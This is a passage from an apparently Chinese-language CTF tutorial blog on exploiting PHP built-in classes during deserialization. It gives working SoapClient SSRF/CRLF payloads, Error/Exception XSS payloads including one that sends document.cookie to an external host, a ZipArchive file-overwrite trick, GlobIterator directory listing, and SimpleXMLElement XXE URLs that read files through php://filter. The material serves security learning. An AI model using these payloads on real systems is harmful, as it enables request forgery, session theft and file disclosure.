class="hljs-built_in">AssertionError</span>::__wakeup<span class="hljs-built_in">AssertionError</span>::__toStringDOMException::__wakeupDOMException::__toStringPDOException::__wakeupPDOException::__toStringPDO::__wakeupPDOStatement::__wakeupSimpleXMLElement::__toStringSimpleXMLIterator::__toStringCURLFile::__wakeupmysqli_sql_exception::__wakeupmysqli_sql_exception::__toStringPharException::__wakeupPharException::__toStringPhar::__destructPhar::__toStringPharData::__destructPharData::__toStringPharFileInfo::__destructPharFileInfo::__toStringSoapClient::__callSoapFault::__toStringSoapFault::__wakeup</code></pre></div><h3 id="SoapClient构造ssrf和crlf"><a href="#SoapClient构造ssrf和crlf" class="headerlink" title="SoapClient构造ssrf和crlf"></a>SoapClient构造ssrf和crlf</h3><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/804631-20180316165041409-1571225758.jpg" alt="img"></p><p>但是它仅限于http/https协议，可以构造post请求，导致ssrf。</p><p>这里http头部还存在crlf漏洞</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$poc</span> = <span class="hljs-string">&quot;CONFIG SET dir /root/&quot;</span>;<span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://example.com:5555/&quot;</span>;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;hello^^&#x27;</span>.<span class="hljs-variable">$poc</span>.<span class="hljs-string">&#x27;^^hello&#x27;</span>));<span class="hljs-variable">$aaa</span> = serialize(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\n\r&quot;</span>,<span class="hljs-variable">$aaa</span>); <span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$aaa</span>);<span class="hljs-comment">//Test</span><span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$aaa</span>);<span class="hljs-variable">$c</span>-&gt;notexists();</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/804631-20180316165113533-1948175046.jpg" alt="img"></p><p>对于如何发送POST的数据包，这里面还有一个坑，就是<code>content-type</code>的设置，当是可以看到上面的数据包，<code>user_agent</code>的头部是在<code>content-type</code>的下面，所以我们可以通过<code>SoapClient</code>来设置<code>user_agent</code>，再使用crlf将<code>content-type</code>给往下挤。</p><h4 id="来自wupco师傅构造任意post报文的poc"><a href="#来自wupco师傅构造任意post报文的poc" class="headerlink" title="来自wupco师傅构造任意post报文的poc:"></a><strong>来自wupco师傅构造任意post报文的poc:</strong></h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://example.com:5555/&quot;</span>;<span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;data=abc&#x27;</span>;<span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,    <span class="hljs-string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> SoapClient(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.join(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)strlen(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;hello&#x27;</span>));<span class="hljs-variable">$aaa</span> = serialize(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\n\r&quot;</span>,<span class="hljs-variable">$aaa</span>);<span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$aaa</span>);</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/804631-20180316165126622-199442235.jpg" alt="img"></p><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>LCTF2018 签到题</p><h3 id="Error类构造xss"><a href="#Error类构造xss" class="headerlink" title="Error类构造xss"></a>Error类构造xss</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);<span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$b</span>);<span class="hljs-comment">//Test</span><span class="hljs-variable">$t</span> = urldecode(<span class="hljs-string">&#x27;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&#x27;</span>);<span class="hljs-variable">$c</span> = unserialize(<span class="hljs-variable">$t</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$c</span>;</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/804631-20180316165139761-1813736165.jpg" alt="img"></p><h4 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h4><h3 id="Exception类构造xss"><a href="#Exception类构造xss" class="headerlink" title="Exception类构造xss"></a>Exception类构造xss</h3><p>适用于php5、7版本</p><p>开启报错的情况下:</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);<span class="hljs-variable">$b</span> = serialize(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> urlencode(<span class="hljs-variable">$b</span>);<span class="hljs-comment">//Test</span><span class="hljs-variable">$c</span> = urldecode(<span class="hljs-string">&#x27;O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D&#x27;</span>);<span class="hljs-keyword">echo</span> unserialize(<span class="hljs-variable">$c</span>);</code></pre></div><h4 id="例子：BJDCTF-2rd-XSS之光"><a href="#例子：BJDCTF-2rd-XSS之光" class="headerlink" title="例子：BJDCTF 2rd XSS之光"></a>例子：BJDCTF 2rd XSS之光</h4><p>Git泄露，用GitHack dump下来：</p><p>只有一个<code>index.php</code>文件：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;yds_is_so_beautiful&#x27;</span>];<span class="hljs-keyword">echo</span> unserialize(<span class="hljs-variable">$a</span>);</code></pre></div><blockquote><p>yds？？？杨大树？？？</p></blockquote><p>Error类就是php的一个内置类用于自动自定义一个<code>Error</code>，在php7的环境下可能会造成一个<code>xss</code>漏洞，因为它内置有一个<code>toString</code>的方法。</p><blockquote><p>Exception类跟Error类原理一样，但是也适用于PHP5</p></blockquote><p>我们先来验证一下：</p><p>POC</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>);<span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-variable">$a</span>));</code></pre></div><p>得到编码后的反序列化结果：</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Exception%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">10</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">25</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Cscript%<span class="hljs-number">3</span>Ealert%<span class="hljs-number">281</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>C%<span class="hljs-number">2</span>Fscript%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">17</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>string%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">18</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Fusercode%<span class="hljs-number">2</span>Ffile.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">7</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>line%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A<span class="hljs-number">2</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">16</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>trace%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">19</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Exception%<span class="hljs-number">00</span>previous%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D</code></pre></div><p>成功触发XSS。</p><p>也可以直接打cookie：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$s</span> = <span class="hljs-string">&#x27;&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://f7ffa642-8f7f-4879-bc49-e75d26e7c2bc.node3.buuoj.cn/a?&quot;+escape(document.cookie);&lt;/script&gt;&#x27;</span>;<span class="hljs-keyword">echo</span> serialize(<span class="hljs-variable">$s</span>);</code></pre></div><h3 id="原生类同名函数：ZipArchive-open-文件写"><a href="#原生类同名函数：ZipArchive-open-文件写" class="headerlink" title="原生类同名函数：ZipArchive::open 文件写"></a>原生类同名函数：ZipArchive::open 文件写</h3><p>首先先认识原生类同名函数的攻击漏洞，先假设我们有一个上传类如下</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Upload</span></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span></span>)</span>&#123;        <span class="hljs-comment">//这是一个你不能修改的文件, prprprpr</span>    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">open</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span></span>)</span>&#123;        <span class="hljs-comment">//你还是不能修改, lololololol</span>    &#125;&#125;</code></pre></div><p>这个上传类被.htaccess文件控制的很死，难以上传我们的小马，即使成功上传了，也不能执行，只有删除了.htaccess文件才可以，那么我们要怎么利用呢<br>所以我们现在就是要先找到一个函数，能删除或者覆盖掉.htaccess文件，先搜索一波</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">foreach</span> (get_declared_classes() <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>)&#123;    <span class="hljs-keyword">foreach</span> (get_class_methods(<span class="hljs-variable">$class</span>)  <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>)&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$method</span> == <span class="hljs-string">&quot;open&quot;</span>)&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$class</span> -&gt; <span class="hljs-subst">$method</span>&quot;</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;        &#125;    &#125;&#125;</code></pre></div><p>这里搜索到三个函数</p><div class="hljs code-wrapper"><pre><code class="hljs php">SessionHandler -&gt; openZipArchive -&gt; openXMLReader -&gt; open</code></pre></div><p><code>ZipArchive::open</code></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/13.png"></p><p>可以看到<code>flag</code>参数有个<code>ZipArchive::OVERWRITE</code>模式，继续找它的官方介绍能看到</p><div class="hljs code-wrapper"><pre><code class="hljs lasso">ZIPARCHIVE<span class="hljs-type">::OVERWRITE</span> (<span class="hljs-built_in">integer</span>)总是以一个新的压缩包开始，此模式下如果已经存在则会被覆盖。</code></pre></div><p>我们先测试一下<br><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/14.png" alt="img"><br>可以看到确实成功的删除了文件，因此我们就可以达到了删除固定文件的目的，也就摆脱了.htaccess文件的限制了</p><h4 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h4><h3 id="GlobIterator：目录枚举"><a href="#GlobIterator：目录枚举" class="headerlink" title="GlobIterator：目录枚举"></a>GlobIterator：目录枚举</h3><p>危害：</p><ul><li>可以达到目录遍历的效果</li></ul><h4 id="例子：红日代码审计day3-ctf题"><a href="#例子：红日代码审计day3-ctf题" class="headerlink" title="例子：红日代码审计day3 ctf题"></a>例子：红日代码审计day3 ctf题</h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotFound</span></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;404&#x27;</span>);    &#125;&#125;spl_autoload_register(    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;        <span class="hljs-keyword">new</span> NotFound();    &#125;);<span class="hljs-variable">$classname</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-literal">null</span>;<span class="hljs-variable">$param</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>] : <span class="hljs-literal">null</span>;<span class="hljs-variable">$param2</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] : <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(class_exists(<span class="hljs-variable">$classname</span>))&#123;    <span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$classname</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$param2</span>);    var_dump(<span class="hljs-variable">$newclass</span>);    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$newclass</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&gt;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;&#125;</code></pre></div><p><strong>The GlobIterator class</strong></p><p>(PHP 5 &gt;= 5.3.0, PHP 7)</p><p>遍历一个文件系统行为类似于 <a href="https://www.php.net/manual/zh/function.glob.php">glob()</a>.</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-built_in">GlobIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">FilesystemIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">SeekableIterator</span> , <span class="hljs-built_in">Countable</span> &#123;<span class="hljs-comment">/* 方法 */</span><span class="hljs-keyword">public</span> __construct ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-built_in">FilesystemIterator</span>::KEY_AS_PATHNAME | <span class="hljs-built_in">FilesystemIterator</span>::CURRENT_AS_FILEINFO ] )<span class="hljs-keyword">public</span> count ( <span class="hljs-keyword">void</span> ) : <span class="hljs-keyword">int</span><span class="hljs-comment">/* 继承的方法 */</span><span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::__construct ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-built_in">FilesystemIterator</span>::KEY_AS_PATHNAME | <span class="hljs-built_in">FilesystemIterator</span>::CURRENT_AS_FILEINFO | <span class="hljs-built_in">FilesystemIterator</span>::SKIP_DOTS ] )<span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::current ( <span class="hljs-keyword">void</span> ) : mixed<span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::getFlags ( <span class="hljs-keyword">void</span> ) : <span class="hljs-keyword">int</span><span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::key ( <span class="hljs-keyword">void</span> ) : <span class="hljs-keyword">string</span><span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::next ( <span class="hljs-keyword">void</span> ) : <span class="hljs-keyword">void</span><span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::rewind ( <span class="hljs-keyword">void</span> ) : <span class="hljs-keyword">void</span><span class="hljs-keyword">public</span> <span class="hljs-built_in">FilesystemIterator</span>::setFlags ([ <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> ] ) : <span class="hljs-keyword">void</span>&#125;</code></pre></div><p>主要关注GlobIterator的__construct方法</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-built_in">GlobIterator</span>::__construct ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-built_in">FilesystemIterator</span>::KEY_AS_PATHNAME | <span class="hljs-built_in">FilesystemIterator</span>::CURRENT_AS_FILEINFO ] )</code></pre></div><p>这里用到CURRENT_AS_FILEINFO，其值为0.<code>const integer CURRENT_AS_FILEINFO = 0 ;</code></p><p>payload：</p><p><code>http://127.0.0.1/PHP-Audit-Labs/day/day3/CTF/?name=GlobIterator&amp;param=./*.php&amp;param2=0</code></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200829095823083.png" alt="image-20200829095823083"></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200829100518237.png" alt="image-20200829100518237"></p><p>可以看到使用glob协议访问目录</p><p>我们将会发现flag的文件名为 <strong>f1agi3hEre.php</strong> ，接下来我们使用内置类 <strong>SimpleXMLElement</strong> 读取 <strong>f1agi3hEre.php</strong> 文件的内容。</p><h3 id="SimpleXMLElement：XXE"><a href="#SimpleXMLElement：XXE" class="headerlink" title="SimpleXMLElement：XXE"></a>SimpleXMLElement：XXE</h3><p>此类是PHP SimpleXML扩展的一部分，该扩展可在大多数PHP安装中使用。实例化的对象时<code>SimpleXMLElement</code>，传递给其构造函数的数据将解析为XML</p><p>利用条件：</p><ul><li>xmllib库为存在漏洞的版本</li><li>有实例化对象的点即可</li></ul><p>危害（xxe）：</p><ul><li>任意文件读取</li><li>SSRF</li></ul><div class="hljs code-wrapper"><pre><code class="hljs php">SimpleXMLElement::__construct ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$data</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$options</span> = <span class="hljs-number">0</span> [, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$data_is_url</span> = <span class="hljs-literal">false</span> [, <span class="hljs-keyword">string</span> <span class="hljs-variable">$ns</span> = <span class="hljs-string">&quot;&quot;</span> [, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$is_prefix</span> = <span class="hljs-literal">false</span> ]]]] )</code></pre></div><h4 id="例子：红日代码审计day3-ctf题-1"><a href="#例子：红日代码审计day3-ctf题-1" class="headerlink" title="例子：红日代码审计day3 ctf题"></a>例子：红日代码审计day3 ctf题</h4><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NotFound</span></span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;404&#x27;</span>);    &#125;&#125;spl_autoload_register(    <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"><span class="hljs-variable">$class</span></span>)</span>&#123;        <span class="hljs-keyword">new</span> NotFound();    &#125;);<span class="hljs-variable">$classname</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-literal">null</span>;<span class="hljs-variable">$param</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param&#x27;</span>] : <span class="hljs-literal">null</span>;<span class="hljs-variable">$param2</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;param2&#x27;</span>] : <span class="hljs-literal">null</span>;<span class="hljs-keyword">if</span>(class_exists(<span class="hljs-variable">$classname</span>))&#123;    <span class="hljs-variable">$newclass</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$classname</span>(<span class="hljs-variable">$param</span>,<span class="hljs-variable">$param2</span>);    var_dump(<span class="hljs-variable">$newclass</span>);    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$newclass</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$value</span>)        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27;=&gt;&#x27;</span>.<span class="hljs-variable">$value</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>;&#125;</code></pre></div><p>实例化类的类名和传入类的参数均在用户的控制之下。攻击者可以通过该漏洞，调用PHP代码库的任意构造函数。即使代码本身不包含易受攻击的构造函数，我们也可以使用PHP的内置类 <strong>SimpleXMLElement</strong> 来进行 <strong>XXE</strong> 攻击，进而读取目标文件的内容，甚至命令执行（前提是安装了PHP拓展插件expect），我们来看一下PHP手册对 <a href="https://www.php.net/manual/zh/simplexmlelement.construct.php"><strong>SimpleXMLElement</strong></a> 类的定义：</p><p><img src="https://miro.medium.com/max/1312/1*H6rj5C6Z7hz9FchcNC3mZw.png" alt="Image for post"></p><p>我们将会发现flag的文件名为 <strong>f1agi3hEre.php</strong> ，接下来我们使用内置类 <strong>SimpleXMLElement</strong> 读取 <strong>f1agi3hEre.php</strong> 文件的内容,，这里我们要结合使用PHP流的使用，因为当文件中存在： <strong>&lt; &gt; &amp; ‘ “</strong> 这5个符号时，会导致XML文件解析错误，所以我们这里利用PHP文件流，将要读取的文件内容经过 <strong>base64编码</strong> 后输出即可，具体payload如下：</p><p>windows</p><div class="hljs code-wrapper"><pre><code class="hljs url">?name&#x3D;SimpleXMLElement&amp;para&#x3D;?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;D:\phpStudy\PHPTutorial\WWW\PSC2017\snowflake\f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;&amp;param2&#x3D;2</code></pre></div><p><strong>linux</strong></p><div class="hljs code-wrapper"><pre><code class="hljs url">http:&#x2F;&#x2F;localhost&#x2F;CTF&#x2F;index.php?name&#x3D;SimpleXMLElement&amp;param&#x3D;&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;CTF&#x2F;f1agi3hEre.php&quot;&gt;]&gt;&lt;x&gt;%26xxe;&lt;&#x2F;x&gt;&amp;param2&#x3D;2</code></pre></div><p>第二个参数实际上这里2对应的模式是 <strong>LIBXML_NOENT</strong>，因为在libxml&gt;=2.9.0以后的版本默认不开启外部实体解析，需要添加这个参数开启。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200829103309104.png" alt="image-20200829103309104"></p><h2 id="0x07-php反序列化扩展phar"><a href="#0x07-php反序列化扩展phar" class="headerlink" title="0x07 php反序列化扩展phar"></a>0x07 php反序列化扩展phar</h2><h3 id="基本概念和常见利用方法"><a href="#基本概念和常见利用方法" class="headerlink" title="基本概念和常见利用方法"></a>基本概念和常见利用方法</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>Phar（PHP Archive）文件是一种打包格式，将PHP代码文件和其他资源放入一个文件中来实现应用程序和库的分发。</p><p>在来自Secarma的安全研究员Sam Thomas在18年的Black Hat上提出后利用方式后，开始受到广泛的关注。</p><p>Phar可利用是因为Phar以序列化的形式存储用户自定义的meta-data，而以流的形式打开的时候，会自动反序列化，从而触发对应的攻击载荷。</p><h4 id="Phar文件结构"><a href="#Phar文件结构" class="headerlink" title="Phar文件结构"></a>Phar文件结构</h4><p>Phar由四个部分组成，分别是 <code>stub</code> / 